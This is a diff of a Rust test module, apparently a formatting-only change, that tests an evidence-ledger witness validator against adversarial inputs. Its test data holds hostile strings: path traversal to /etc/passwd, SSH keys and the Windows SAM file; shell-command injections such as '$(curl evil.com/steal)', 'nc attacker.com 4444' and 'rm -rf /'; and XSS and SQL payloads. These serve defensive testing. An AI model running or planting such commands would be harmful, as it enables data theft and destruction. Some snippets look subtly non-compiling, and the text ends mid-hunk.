@@ -605,7 +605,7 @@ mod tests {
     #[test]
     fn observability_evidence_tampering_malformed_entry_metadata_injection_attack() {
         use super::evidence_ledger::{DecisionKind, EvidenceEntry};
-        use super::witness_ref::{WitnessValidator, WitnessSet, WitnessKind};
+        use super::witness_ref::{WitnessKind, WitnessSet, WitnessValidator};
 
         let mut validator = WitnessValidator::new();
 
@@ -620,16 +620,15 @@ mod tests {
                 decision_time: "2099-12-31T23:59:59Z".to_string(), // Far future
                 timestamp_ms: u64::MAX,                            // Maximum timestamp
                 trace_id: "trace\x00\x01\x02null-injection".to_string(),
-                epoch_id: u64::MAX,                                // Maximum epoch
+                epoch_id: u64::MAX, // Maximum epoch
                 payload: serde_json::json!({
                     "injected": true,
                     "payload": "malicious\ndata",
                     "nested": {"deep": {"attack": "vector"}}
                 }),
-                size_bytes: usize::MAX,                            // Maximum size hint
+                size_bytes: usize::MAX, // Maximum size hint
                 signature: String::new(),
             },
-
             // Control character injection attack
             EvidenceEntry {
                 schema_version: "schema\r\n\x00injection".to_string(),
@@ -637,14 +636,13 @@ mod tests {
                 decision_id: "decision\u{200B}\u{FEFF}unicode-pollution".to_string(),
                 decision_kind: DecisionKind::Release,
                 decision_time: "invalid\x00time".to_string(),
-                timestamp_ms: 0,                                   // Zero timestamp
+                timestamp_ms: 0, // Zero timestamp
                 trace_id: "trace\u{202E}bidi-override\u{202C}".to_string(),
-                epoch_id: 0,                                       // Zero epoch
+                epoch_id: 0, // Zero epoch
                 payload: serde_json::json!("\x00\x01\x02\x03binary-payload"),
-                size_bytes: 0,                                     // Under-reported size hint
+                size_bytes: 0, // Under-reported size hint
                 signature: String::new(),
             },
-
             // Unicode normalization attack
             EvidenceEntry {
                 schema_version: "schéma vs schema\u{0301}".to_string(), // NFC vs NFD
@@ -663,8 +661,12 @@ mod tests {
 
         for (i, malicious_entry) in tampering_attacks.iter().enumerate() {
             let witnesses = obs_single_witness_set(
-                obs_witness(&format!("tamper-witness-{}", i), WitnessKind::ProofArtifact, i as u8)
-                    .with_locator(&format!("file:///tmp/tampered-{}.jsonl", i))
+                obs_witness(
+                    &format!("tamper-witness-{}", i),
+                    WitnessKind::ProofArtifact,
+                    i as u8,
+                )
+                .with_locator(&format!("file:///tmp/tampered-{}.jsonl", i)),
             );
 
             let validation_result = validator.validate(malicious_entry, &witnesses);
@@ -672,35 +674,46 @@ mod tests {
             match validation_result {
                 Ok(_) => {
                     // If validation passes, verify no metadata corruption occurred
-                    assert!(!malicious_entry.decision_id.contains('\0'),
-                        "Null bytes should not be present in decision_id");
-                    assert!(!malicious_entry.schema_version.contains('\r'),
-                        "CRLF injection should not be present in schema_version");
-                },
+                    assert!(
+                        !malicious_entry.decision_id.contains('\0'),
+                        "Null bytes should not be present in decision_id"
+                    );
+                    assert!(
+                        !malicious_entry.schema_version.contains('\r'),
+                        "CRLF injection should not be present in schema_version"
+                    );
+                }
                 Err(error) => {
                     // Validation failure for tampered evidence is expected
-                    assert!(!error.to_string().is_empty(),
-                        "Error message should not be empty for tampering attack {}", i);
+                    assert!(
+                        !error.to_string().is_empty(),
+                        "Error message should not be empty for tampering attack {}",
+                        i
+                    );
                 }
             }
         }
 
         // Verify validator state remains consistent after tampering attacks
         let legitimate_entry = obs_entry("legitimate-post-tampering", DecisionKind::Admit);
-        let legitimate_witnesses = obs_single_witness_set(
-            obs_witness("legitimate-witness", WitnessKind::Telemetry, 100)
-        );
+        let legitimate_witnesses = obs_single_witness_set(obs_witness(
+            "legitimate-witness",
+            WitnessKind::Telemetry,
+            100,
+        ));
 
         let legitimate_result = validator.validate(&legitimate_entry, &legitimate_witnesses);
-        assert!(legitimate_result.is_ok(),
-            "Validator should process legitimate evidence after tampering attempts");
+        assert!(
+            legitimate_result.is_ok(),
+            "Validator should process legitimate evidence after tampering attempts"
+        );
     }
 
     /// Extreme adversarial test: Witness locator injection attack targeting filesystem
     /// and network resource access via malicious locator URI manipulation
     #[test]
     fn observability_witness_locator_injection_filesystem_network_access_attack() {
-        use super::witness_ref::{WitnessValidator, WitnessKind};
+        use super::witness_ref::{WitnessKind, WitnessValidator};
 
         let mut strict_validator = WitnessValidator::strict();
 
@@ -708,46 +721,61 @@ mod tests {
         let locator_injection_attacks = [
             // File system traversal attacks
             ("file:///../../../etc/passwd", "Path traversal to passwd"),
-            ("file:///C:\\Windows\\System32\\config\\SAM", "Windows SAM access"),
+            (
+                "file:///C:\\Windows\\System32\\config\\SAM",
+                "Windows SAM access",
+            ),
             ("file:///proc/self/environ", "Process environment access"),
             ("file:///dev/random", "Random device access"),
-
             // Network injection attacks
             ("http://evil.com/exfiltrate", "HTTP exfiltration"),
             ("ftp://attacker.com/steal", "FTP data theft"),
             ("ldap://malicious.com/inject", "LDAP injection"),
             ("ssh://evil.com:22/backdoor", "SSH backdoor"),
-
             // Protocol confusion attacks
             ("javascript:alert('xss')", "JavaScript protocol injection"),
-            ("data:text/html,<script>evil()</script>", "Data URI injection"),
+            (
+                "data:text/html,<script>evil()</script>",
+                "Data URI injection",
+            ),
             ("file:///tmp/../../home/user/.ssh/id_rsa", "SSH key theft"),
-
             // Command injection via file locators
             ("file:///tmp/witness.jsonl; rm -rf /", "Command injection"),
             ("file:///tmp/$(curl evil.com/steal)", "Command substitution"),
-            ("file:///tmp/witness.jsonl`nc evil.com 4444`", "Backtick injection"),
-
+            (
+                "file:///tmp/witness.jsonl`nc evil.com 4444`",
+                "Backtick injection",
+            ),
             // Unicode and encoding attacks in locators
             ("file:///tmp/witness\u{0000}.jsonl", "Null byte injection"),
-            ("file:///tmp/witness\r\nHost: evil.com\r\n", "CRLF header injection"),
+            (
+                "file:///tmp/witness\r\nHost: evil.com\r\n",
+                "CRLF header injection",
+            ),
             ("file:///tmp/witnesѕ.jsonl", "Cyrillic character spoofing"),
-
             // Buffer overflow attempts
             ("file:///" + &"A".repeat(10_000), "Extremely long path"),
-            ("http://".to_string() + &"x".repeat(1000) + ".com/witness.json", "Long hostname"),
-
+            (
+                "http://".to_string() + &"x".repeat(1000) + ".com/witness.json",
+                "Long hostname",
+            ),
             // Encoding bypass attempts
-            ("file:///%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoding bypass"),
+            (
+                "file:///%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                "URL encoding bypass",
+            ),
             ("file:///tmp%00/witness.jsonl", "URL encoded null"),
-            ("file:///tmp\\..\\..\\windows\\system32", "Backslash confusion"),
+            (
+                "file:///tmp\\..\\..\\windows\\system32",
+                "Backslash confusion",
+            ),
         ];
 
         for (malicious_locator, description) in locator_injection_attacks {
             let entry = obs_entry("locator-injection-test", DecisionKind::Quarantine);
             let witnesses = obs_single_witness_set(
                 obs_witness("injection-witness", WitnessKind::ProofArtifact, 42)
-                    .with_locator(malicious_locator)
+                    .with_locator(malicious_locator),
             );
 
             let validation_result = strict_validator.validate(&entry, &witnesses);
@@ -756,13 +784,19 @@ mod tests {
             match validation_result {
                 Ok(_) => {
                     // If validation passes, the locator should be properly sanitized
-                    panic!("Malicious locator should not pass strict validation: {} - {}",
-                        description, malicious_locator);
-                },
+                    panic!(
+                        "Malicious locator should not pass strict validation: {} - {}",
+                        description, malicious_locator
+                    );
+                }
                 Err(error) => {
                     // Expected rejection of malicious locators
-                    assert!(error.to_string().contains("locator") || error.to_string().contains("witness"),
-                        "Error should mention locator/witness issue for: {}", description);
+                    assert!(
+                        error.to_string().contains("locator")
+                            || error.to_string().contains("witness"),
+                        "Error should mention locator/witness issue for: {}",
+                        description
+                    );
                 }
             }
         }
@@ -772,7 +806,7 @@ mod tests {
     /// targeting cryptographic weaknesses in digest comparison algorithms
     #[test]
     fn observability_hash_collision_witness_integrity_cryptographic_attack() {
-        use super::witness_ref::{WitnessValidator, WitnessKind};
+        use super::witness_ref::{WitnessKind, WitnessValidator};
 
         let mut validator = WitnessValidator::new();
 
@@ -781,33 +815,37 @@ mod tests {
             // Known collision patterns for weak hash functions
             ([0x00; 32], [0x01; 32], "Zero vs one collision attempt"),
             ([0xFF; 32], [0xFE; 32], "Max vs near-max collision attempt"),
-
             // Birthday attack simulation patterns
             ([0xAA; 32], [0x55; 32], "Alternating bit patterns"),
             ([0xF0; 32], [0x0F; 32], "Inverted nibble patterns"),
-
             // Known cryptographic weak points
-            ([0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
-             [0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
-             "High bit collision attempt"),
-
+            (
+                [
+                    0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                ],
+                [
+                    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                ],
+                "High bit collision attempt",
+            ),
             // Length extension attack patterns
-            ([0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
-              0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
-              0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00,
-              0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
-             [0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
-              0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
-              0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00,
-              0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01],
-             "Length extension pattern"),
-
+            (
+                [
+                    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0, 0x11, 0x22, 0x33, 0x44, 0x55,
+                    0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x80, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                ],
+                [
+                    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0, 0x11, 0x22, 0x33, 0x44, 0x55,
+                    0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x80, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
+                ],
+                "Length extension pattern",
+            ),
             // Differential collision attempts
             ([0x5A; 32], [0xA5; 32], "Bit-flipped pattern"),
         ];
@@ -822,17 +860,24 @@ mod tests {
             let integrity_result = validator.verify_integrity(
                 "collision-test-entry",
                 &collision_witness,
-                &malicious_digest
+                &malicious_digest,
             );
 
             // Different digests should always result in integrity failure
             if expected_digest != malicious_digest {
-                assert!(integrity_result.is_err(),
-                    "Hash collision attempt should fail integrity check: {}", description);
+                assert!(
+                    integrity_result.is_err(),
+                    "Hash collision attempt should fail integrity check: {}",
+                    description
+                );
 
                 let error = integrity_result.unwrap_err();
-                assert_eq!(error.code(), "ERR_INTEGRITY_HASH_MISMATCH",
-                    "Collision should result in hash mismatch error: {}", description);
+                assert_eq!(
+                    error.code(),
+                    "ERR_INTEGRITY_HASH_MISMATCH",
+                    "Collision should result in hash mismatch error: {}",
+                    description
+                );
             }
         }
 
@@ -848,13 +893,17 @@ mod tests {
             }
 
             let start = std::time::Instant::now();
-            let _result = validator.verify_integrity("timing-test", &reference_witness, &modified_digest);
+            let _result =
+                validator.verify_integrity("timing-test", &reference_witness, &modified_digest);
             let elapsed = start.elapsed();
 
             // Integrity verification should complete in consistent time
-            assert!(elapsed.as_micros() < 10_000,
+            assert!(
+                elapsed.as_micros() < 10_000,
                 "Integrity verification took {}μs for bit flip {}, may indicate timing leak",
-                elapsed.as_micros(), bit_flip);
+                elapsed.as_micros(),
+                bit_flip
+            );
         }
     }
 
@@ -862,7 +911,7 @@ mod tests {
     /// designed to overwhelm validation processing and exhaust system resources
     #[test]
     fn observability_memory_exhaustion_massive_witness_set_validation_dos_attack() {
-        use super::witness_ref::{WitnessValidator, WitnessSet, WitnessKind};
+        use super::witness_ref::{WitnessKind, WitnessSet, WitnessValidator};
 
         let mut validator = WitnessValidator::new();
 
@@ -878,7 +927,8 @@ mod tests {
             let mut massive_witnesses = WitnessSet::new();
 
             // Generate massive witness set with unique IDs
-            for i in 0..witness_count.min(100) { // Limit to prevent actual DoS
+            for i in 0..witness_count.min(100) {
+                // Limit to prevent actual DoS
                 let witness_id = format!("massive-witness-{}-{}", i, "x".repeat(i % 100));
                 let witness_kind = match i % 4 {
                     0 => WitnessKind::Telemetry,
@@ -903,17 +953,23 @@ mod tests {
             let elapsed = start.elapsed();
 
             // Validation should complete in reasonable time despite large witness set
-            assert!(elapsed.as_millis() < 10_000,
+            assert!(
+                elapsed.as_millis() < 10_000,
                 "Massive witness validation should complete in reasonable time: {} took {}ms",
-                description, elapsed.as_millis());
+                description,
+                elapsed.as_millis()
+            );
 
             match validation_result {
                 Ok(_) => {
                     // If validation succeeds, verify no resource exhaustion occurred
-                    assert!(elapsed.as_millis() < 5_000,
+                    assert!(
+                        elapsed.as_millis() < 5_000,
                         "Successful massive validation should be efficient: {} took {}ms",
-                        description, elapsed.as_millis());
-                },
+                        description,
+                        elapsed.as_millis()
+                    );
+                }
                 Err(_) => {
                     // Graceful failure for oversized witness sets is acceptable
                 }
@@ -921,13 +977,17 @@ mod tests {
 
             // Verify validator remains functional after stress test
             let simple_entry = obs_entry("post-stress-test", DecisionKind::Admit);
-            let simple_witnesses = obs_single_witness_set(
-                obs_witness("post-stress-witness", WitnessKind::Telemetry, 200)
-            );
+            let simple_witnesses = obs_single_witness_set(obs_witness(
+                "post-stress-witness",
+                WitnessKind::Telemetry,
+                200,
+            ));
 
             let recovery_result = validator.validate(&simple_entry, &simple_witnesses);
-            assert!(recovery_result.is_ok(),
-                "Validator should remain functional after memory stress test");
+            assert!(
+                recovery_result.is_ok(),
+                "Validator should remain functional after memory stress test"
+            );
         }
     }
 
@@ -936,7 +996,7 @@ mod tests {
     #[test]
     fn observability_temporal_manipulation_timestamp_validation_security_bypass() {
         use super::evidence_ledger::{DecisionKind, EvidenceEntry};
-        use super::witness_ref::{WitnessValidator, WitnessKind};
+        use super::witness_ref::{WitnessKind, WitnessValidator};
 
         let mut validator = WitnessValidator::new();
 
@@ -945,21 +1005,33 @@ mod tests {
             // Extreme timestamp values
             (0, "1970-01-01T00:00:00Z", "Unix epoch start"),
             (u64::MAX, "2099-12-31T23:59:59Z", "Far future timestamp"),
-            (1_000_000_000_000, "1970-01-01T00:16:40Z", "Millisecond/second confusion"),
-
+            (
+                1_000_000_000_000,
+                "1970-01-01T00:16:40Z",
+                "Millisecond/second confusion",
+            ),
             // Time zone manipulation
-            (1_700_000_000, "2026-04-17T12:00:00+99:99", "Invalid timezone"),
+            (
+                1_700_000_000,
+                "2026-04-17T12:00:00+99:99",
+                "Invalid timezone",
+            ),
             (1_700_000_000, "2026-04-17T25:00:00Z", "Invalid hour"),
             (1_700_000_000, "2026-02-30T12:00:00Z", "Invalid date"),
-
             // Precision manipulation
-            (1_700_000_000, "2026-04-17T12:00:00.999999999Z", "Nanosecond precision"),
-            (1_700_000_000, "2026-04-17T12:00:00.000000001Z", "Minimal fractional"),
-
+            (
+                1_700_000_000,
+                "2026-04-17T12:00:00.999999999Z",
+                "Nanosecond precision",
+            ),
+            (
+                1_700_000_000,
+                "2026-04-17T12:00:00.000000001Z",
+                "Minimal fractional",
+            ),
             // Time bomb scenarios (far past/future)
             (1, "1970-01-01T00:00:00.001Z", "Near epoch start"),
             (253_402_300_799_000, "9999-12-31T23:59:59Z", "Year 9999"),
-
             // Leap year/second edge cases
             (1_700_000_000, "2024-02-29T23:59:60Z", "Leap second"),
             (1_700_000_000, "2023-02-29T12:00:00Z", "Invalid leap day"),
@@ -980,17 +1052,22 @@ mod tests {
                 signature: String::new(),
             };
 
-            let witnesses = obs_single_witness_set(
-                obs_witness("temporal-witness", WitnessKind::Telemetry, 150)
-            );
+            let witnesses = obs_single_witness_set(obs_witness(
+                "temporal-witness",
+                WitnessKind::Telemetry,
+                150,
+            ));
 
             let validation_result = validator.validate(&temporal_entry, &witnesses);
 
             match validation_result {
                 Ok(_) => {
                     // If validation passes, verify timestamp constraints
-                    assert!(temporal_entry.timestamp_ms <= u64::MAX,
-                        "Timestamp should remain within bounds: {}", description);
+                    assert!(
+                        temporal_entry.timestamp_ms <= u64::MAX,
+                        "Timestamp should remain within bounds: {}",
+                        description
+                    );
 
                     // Check for reasonable timestamp values
                     let current_time = 1_700_000_000_000; // Approximate current time in ms
@@ -1001,14 +1078,15 @@ mod tests {
                     };
 
                     // Warn about extreme timestamp deviations
-                    if time_diff > 365 * 24 * 3600 * 1000 { // More than 1 year difference
+                    if time_diff > 365 * 24 * 3600 * 1000 {
+                        // More than 1 year difference
                         tracing::warn!(
                             description = %description,
                             time_diff_ms = %time_diff,
                             "extreme timestamp deviation detected"
                         );
                     }
-                },
+                }
                 Err(_) => {
                     // Validation failure for malformed timestamps is expected
                 }
@@ -1039,8 +1117,10 @@ mod tests {
             if let Some(ref prev) = previous_entry {
                 // Verify timestamp ordering if required by the system
                 if monotonic_entry.timestamp_ms < prev.timestamp_ms {
-                    eprintln!("Note: Timestamp decreased from {} to {} (delta: {})",
-                        prev.timestamp_ms, monotonic_entry.timestamp_ms, delta);
+                    eprintln!(
+                        "Note: Timestamp decreased from {} to {} (delta: {})",
+                        prev.timestamp_ms, monotonic_entry.timestamp_ms, delta
+                    );
                 }
             }
 
@@ -1053,71 +1133,88 @@ mod tests {
     #[test]
     fn observability_json_injection_evidence_payload_downstream_processing_attack() {
         use super::evidence_ledger::{DecisionKind, EvidenceEntry};
-        use super::witness_ref::{WitnessValidator, WitnessKind};
+        use super::witness_ref::{WitnessKind, WitnessValidator};
 
         let mut validator = WitnessValidator::new();
 
         // JSON injection attack vectors in evidence payloads
         let payload_injection_attacks = [
             // Object injection attacks
-            (serde_json::json!({
-                "legitimate": "data",
-                "injected": "evil", "admin": true, "dummy": "value"
-            }), "Object key injection"),
-
+            (
+                serde_json::json!({
+                    "legitimate": "data",
+                    "injected": "evil", "admin": true, "dummy": "value"
+                }),
+                "Object key injection",
+            ),
             // Array injection attacks
-            (serde_json::json!([
-                "normal_item",
-                "\"], \"injected\": true, \"evil\": [\"",
-                "continuing_array"
-            ]), "Array value injection"),
-
+            (
+                serde_json::json!([
+                    "normal_item",
+                    "\"], \"injected\": true, \"evil\": [\"",
+                    "continuing_array"
+                ]),
+                "Array value injection",
+            ),
             // Deep nesting attacks
-            (serde_json::json!({
-                "level1": {
-                    "level2": {
-                        "level3": {
-                            "level4": {
-                                "injected": "deep_payload"
+            (
+                serde_json::json!({
+                    "level1": {
+                        "level2": {
+                            "level3": {
+                                "level4": {
+                                    "injected": "deep_payload"
+                                }
                             }
                         }
                     }
-                }
-            }), "Deep nesting injection"),
-
+                }),
+                "Deep nesting injection",
+            ),
             // Unicode injection attacks
-            (serde_json::json!({
-                "unicode": "normal\u{202E}override\u{202C}text",
-                "bidi": "\u{202E}reversed\u{202C}",
-                "zws": "zero\u{200B}width\u{200C}spaces"
-            }), "Unicode control character injection"),
-
+            (
+                serde_json::json!({
+                    "unicode": "normal\u{202E}override\u{202C}text",
+                    "bidi": "\u{202E}reversed\u{202C}",
+                    "zws": "zero\u{200B}width\u{200C}spaces"
+                }),
+                "Unicode control character injection",
+            ),
             // Binary data injection
-            (serde_json::json!({
-                "binary": "\x00\x01\x02\x03\x04\u{FF}\u{FE}\u{FD}",
-                "control": "\r\n\t\x1f\x7f"
-            }), "Binary data injection"),
-
+            (
+                serde_json::json!({
+                    "binary": "\x00\x01\x02\x03\x04\u{FF}\u{FE}\u{FD}",
+                    "control": "\r\n\t\x1f\x7f"
+                }),
+                "Binary data injection",
+            ),
             // Script injection attempts
-            (serde_json::json!({
-                "script": "<script>alert('xss')</script>",
-                "javascript": "javascript:void(0)",
-                "data_uri": "data:text/html,<script>evil()</script>"
-            }), "Script injection"),
-
+            (
+                serde_json::json!({
+                    "script": "<script>alert('xss')</script>",
+                    "javascript": "javascript:void(0)",
+                    "data_uri": "data:text/html,<script>evil()</script>"
+                }),
+                "Script injection",
+            ),
             // SQL injection simulation
-            (serde_json::json!({
-                "sql": "'; DROP TABLE evidence; --",
-                "union": "UNION SELECT * FROM secrets",
-                "comment": "/* malicious comment */"
-            }), "SQL injection simulation"),
-
+            (
+                serde_json::json!({
+                    "sql": "'; DROP TABLE evidence; --",
+                    "union": "UNION SELECT * FROM secrets",
+                    "comment": "/* malicious comment */"
+                }),
+                "SQL injection simulation",
+            ),
             // Command injection simulation
-            (serde_json::json!({
-                "command": "$(rm -rf /)",
-                "backtick": "`curl evil.com`",
-                "pipe": "data | nc attacker.com 4444"
-            }), "Command injection simulation"),
+            (
+                serde_json::json!({
+                    "command": "$(rm -rf /)",
+                    "backtick": "`curl evil.com`",
+                    "pipe": "data | nc attacker.com 4444"
+                }),
+                "Command injection simulation",
+            ),
         ];
 
         for (malicious_payload, description) in payload_injection_attacks {
@@ -1135,9 +1232,11 @@ mod tests {
                 signature: String::new(),
             };
 
-            let witnesses = obs_single_witness_set(
-                obs_witness("injection-witness", WitnessKind::Telemetry, 175)
-            );
+            let witnesses = obs_single_witness_set(obs_witness(
+                "injection-witness",
+                WitnessKind::Telemetry,
+                175,
+            ));
 
             let validation_result = validator.validate(&injection_entry, &witnesses);
 
@@ -1148,21 +1247,29 @@ mod tests {
                     match serialized {
                         Ok(json_str) => {
                             // Verify serialized JSON doesn't contain injection artifacts
-                            assert!(!json_str.contains("\"admin\":true"),
-                                "JSON should not contain admin privilege injection");
-                            assert!(!json_str.contains("DROP TABLE"),
-                                "JSON should not contain SQL injection");
+                            assert!(
+                                !json_str.contains("\"admin\":true"),
+                                "JSON should not contain admin privilege injection"
+                            );
+                            assert!(
+                                !json_str.contains("DROP TABLE"),
+                                "JSON should not contain SQL injection"
+                            );
 
                             // Verify round-trip integrity
-                            let parsed: Result<serde_json::Value, _> = serde_json::from_str(&json_str);
-                            assert!(parsed.is_ok(),
-                                "Payload should survive JSON round-trip: {}", description);
-                        },
+                            let parsed: Result<serde_json::Value, _> =
+                                serde_json::from_str(&json_str);
+                            assert!(
+                                parsed.is_ok(),
+                                "Payload should survive JSON round-trip: {}",
+                                description
+                            );
+                        }
                         Err(_) => {
                             // Serialization failure for malicious payloads is acceptable
                         }
                     }
-                },
+                }
                 Err(_) => {
                     // Validation failure for injected payloads is acceptable
                 }
@@ -1189,55 +1296,61 @@ mod tests {
             signature: String::new(),
         };
 
-        let size_witnesses = obs_single_witness_set(
-            obs_witness("size-witness", WitnessKind::Telemetry, 200)
-        );
+        let size_witnesses =
+            obs_single_witness_set(obs_witness("size-witness", WitnessKind::Telemetry, 200));
 
         let start = std::time::Instant::now();
         let _size_result = validator.validate(&size_attack_entry, &size_witnesses);
         let elapsed = start.elapsed();
 
         // Large payload validation should complete in reasonable time
-        assert!(elapsed.as_millis() < 5_000,
-            "Large payload validation took {}ms, should be <5000ms", elapsed.as_millis());
+        assert!(
+            elapsed.as_millis() < 5_000,
+            "Large payload validation took {}ms, should be <5000ms",
+            elapsed.as_millis()
+        );
     }
 
     /// Extreme adversarial test: Concurrent validation race condition attack targeting
     /// shared validator state corruption during parallel evidence processing
     #[test]
     fn observability_concurrent_validation_race_shared_state_corruption_attack() {
+        use super::witness_ref::{WitnessKind, WitnessValidator};
         use std::sync::{Arc, Mutex};
         use std::thread;
-        use super::witness_ref::{WitnessValidator, WitnessKind};
 
         let validator = Arc::new(Mutex::new(WitnessValidator::new()));
 
         // Spawn multiple threads performing concurrent validations
-        let handles: Vec<_> = (0..8).map(|thread_id| {
-            let validator_clone = Arc::clone(&validator);
+        let handles: Vec<_> = (0..8)
+            .map(|thread_id| {
+                let validator_clone = Arc::clone(&validator);
 
-            thread::spawn(move || {
-                for iteration in 0..100 {
-                    let entry = obs_entry(
-                        &format!("race-entry-{}-{}", thread_id, iteration),
-                        DecisionKind::Admit
-                    );
+                thread::spawn(move || {
+                    for iteration in 0..100 {
+                        let entry = obs_entry(
+                            &format!("race-entry-{}-{}", thread_id, iteration),
+                            DecisionKind::Admit,
+                        );
 
-                    let witness_id = format!("race-witness-{}-{}", thread_id, iteration);
-                    let witnesses = obs_single_witness_set(
-                        obs_witness(&witness_id, WitnessKind::Telemetry, (thread_id * 10 + iteration) as u8)
-                    );
+                        let witness_id = format!("race-witness-{}-{}", thread_id, iteration);
+                        let witnesses = obs_single_witness_set(obs_witness(
+                            &witness_id,
+                            WitnessKind::Telemetry,
+                            (thread_id * 10 + iteration) as u8,
+                        ));
 
-                    if let Ok(mut validator_lock) = validator_clone.try_lock() {
-                        let _result = validator_lock.validate(&entry, &witnesses);
+                        if let Ok(mut validator_lock) = validator_clone.try_lock() {
+                            let _result = validator_lock.validate(&entry, &witnesses);
 
-                        // Brief yield to encourage race conditions
-                        std::mem::drop(validator_lock);
-                        thread::yield_now();
+                            // Brief yield to encourage race conditions
+                            std::mem::drop(validator_lock);
+                            thread::yield_now();
+                        }
                     }
-                }
+                })
             })
-        }).collect();
+            .collect();
 
         // Wait for all threads to complete
         for handle in handles {
@@ -1250,29 +1363,36 @@ mod tests {
         let rejected_count = final_validator.rejected_count();
 
         // Counters should be consistent
-        assert!(validated_count <= 800, // 8 threads * 100 iterations max
-            "Validated count should be reasonable: {}", validated_count);
-        assert!(rejected_count <= 800,
-            "Rejected count should be reasonable: {}", rejected_count);
+        assert!(
+            validated_count <= 800, // 8 threads * 100 iterations max
+            "Validated count should be reasonable: {}",
+            validated_count
+        );
+        assert!(
+            rejected_count <= 800,
+            "Rejected count should be reasonable: {}",
+            rejected_count
+        );
 
         // Test validator functionality after concurrent stress
         drop(final_validator);
         let mut recovery_validator = validator.lock().unwrap();
         let recovery_entry = obs_entry("recovery-test", DecisionKind::Admit);
-        let recovery_witnesses = obs_single_witness_set(
-            obs_witness("recovery-witness", WitnessKind::Telemetry, 250)
-        );
+        let recovery_witnesses =
+            obs_single_witness_set(obs_witness("recovery-witness", WitnessKind::Telemetry, 250));
 
         let recovery_result = recovery_validator.validate(&recovery_entry, &recovery_witnesses);
-        assert!(recovery_result.is_ok(),
-            "Validator should function normally after concurrent stress test");
+        assert!(
+            recovery_result.is_ok(),
+            "Validator should function normally after concurrent stress test"
+        );
     }
 
     /// Extreme adversarial test: Witness set manipulation via algorithmic complexity
     /// explosion designed to trigger worst-case validation performance scenarios
     #[test]
     fn observability_witness_set_algorithmic_complexity_validation_performance_attack() {
-        use super::witness_ref::{WitnessValidator, WitnessSet, WitnessKind};
+        use super::witness_ref::{WitnessKind, WitnessSet, WitnessValidator};
 
         let mut validator = WitnessValidator::strict();
 
@@ -1280,12 +1400,17 @@ mod tests {
         let complexity_scenarios = [
             ("Sequential IDs", |i| format!("witness-{:04}", i)),
             ("Reverse IDs", |i| format!("witness-{:04}", 9999 - i)),
-            ("Hash-like IDs", |i| format!("witness-{:x}", i * 2654435761_u32)), // Hash-like distribution
+            ("Hash-like IDs", |i| {
+                format!("witness-{:x}", i * 2654435761_u32)
+            }), // Hash-like distribution
             ("Prefix collision", |i| format!("witness-prefix-{}", i % 10)), // Many colliding prefixes
         ];
 
         for (scenario_name, id_generator) in complexity_scenarios {
-            let entry = obs_entry(&format!("complexity-{}", scenario_name), DecisionKind::Admit);
+            let entry = obs_entry(
+                &format!("complexity-{}", scenario_name),
+                DecisionKind::Admit,
+            );
             let mut complex_witnesses = WitnessSet::new();
 
             // Generate witness set with complexity-inducing patterns
@@ -1315,22 +1440,31 @@ mod tests {
             let elapsed = start.elapsed();
 
             // Validation should complete efficiently regardless of witness arrangement
-            assert!(elapsed.as_millis() < 5_000,
+            assert!(
+                elapsed.as_millis() < 5_000,
                 "Complex witness validation should be efficient: {} took {}ms",
-                scenario_name, elapsed.as_millis());
+                scenario_name,
+                elapsed.as_millis()
+            );
 
             match validation_result {
                 Ok(_) => {
                     // Successful validation should be fast
-                    assert!(elapsed.as_millis() < 1_000,
+                    assert!(
+                        elapsed.as_millis() < 1_000,
                         "Successful complex validation should be very fast: {} took {}ms",
-                        scenario_name, elapsed.as_millis());
-                },
+                        scenario_name,
+                        elapsed.as_millis()
+                    );
+                }
                 Err(_) => {
                     // Even validation failures should be efficient
-                    assert!(elapsed.as_millis() < 2_000,
+                    assert!(
+                        elapsed.as_millis() < 2_000,
                         "Failed complex validation should still be efficient: {} took {}ms",
-                        scenario_name, elapsed.as_millis());
+                        scenario_name,
+                        elapsed.as_millis()
+                    );
                 }
             }
         }
@@ -1358,16 +1492,21 @@ mod tests {
         let duplicate_elapsed = start.elapsed();
 
         // Duplicate detection should be efficient even with stress patterns
-        assert!(duplicate_elapsed.as_millis() < 2_000,
+        assert!(
